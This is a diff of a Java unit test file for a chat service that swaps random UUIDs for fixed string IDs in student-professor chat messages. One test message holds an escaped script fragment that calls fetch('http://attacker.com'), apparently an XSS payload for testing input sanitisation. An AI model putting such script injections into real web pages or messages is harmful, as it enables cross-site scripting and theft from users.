@@ -18,7 +18,6 @@ import org.mockito.junit.jupiter.MockitoExtension;
 import java.util.Date;
 import java.util.List;
 import java.util.Optional;
-import java.util.UUID;
 
 import static org.junit.jupiter.api.Assertions.*;
 import static org.mockito.Mockito.*;
@@ -38,13 +37,13 @@ class ChatServiceTest {
     @InjectMocks
     private ChatService chatService;
 
-    private UUID chatRoomId;
-    private UUID userId;
+    private String chatRoomId;
+    private String userId;
 
     @BeforeEach
     void setup() {
-        chatRoomId = UUID.randomUUID();
-        userId = UUID.randomUUID();
+        chatRoomId = "CHR-a1b2c3d4e5f6789012345678901a2b3c";
+        userId = "USR-b2c3d4e5f6789012345678901a2b3c4d";
     }
 
     @Test
@@ -60,7 +59,7 @@ class ChatServiceTest {
 
         ChatMessage savedMessage = new ChatMessage();
 
-        savedMessage.setId(UUID.randomUUID());
+        savedMessage.setId("CHM-c3d4e5f6789012345678901a2b3c4d5e");
 
         savedMessage.setContent(
                 "Professor, could you clarify the assignment deadline?"
@@ -129,7 +128,7 @@ class ChatServiceTest {
 
         ChatMessage savedMessage = new ChatMessage();
 
-        savedMessage.setId(UUID.randomUUID());
+        savedMessage.setId("CHM-d4e5f6789012345678901a2b3c4d5e6f");
 
         savedMessage.setContent(
                 "&lt;script&gt;fetch('http://attacker.com')" +
@@ -162,7 +161,7 @@ class ChatServiceTest {
 
         ChatMessage msg1 = new ChatMessage();
 
-        msg1.setId(UUID.randomUUID());
+        msg1.setId("CHM-e5f6789012345678901a2b3c4d5e6f70");
 
         msg1.setContent(
                 "Does anyone understand exercise 3?"
@@ -172,7 +171,7 @@ class ChatServiceTest {
 
         ChatMessage msg2 = new ChatMessage();
 
-        msg2.setId(UUID.randomUUID());
+        msg2.setId("CHM-f6789012345678901a2b3c4d5e6f7081");
 
         msg2.setContent(
                 "Yes, the professor explained it in class yesterday."
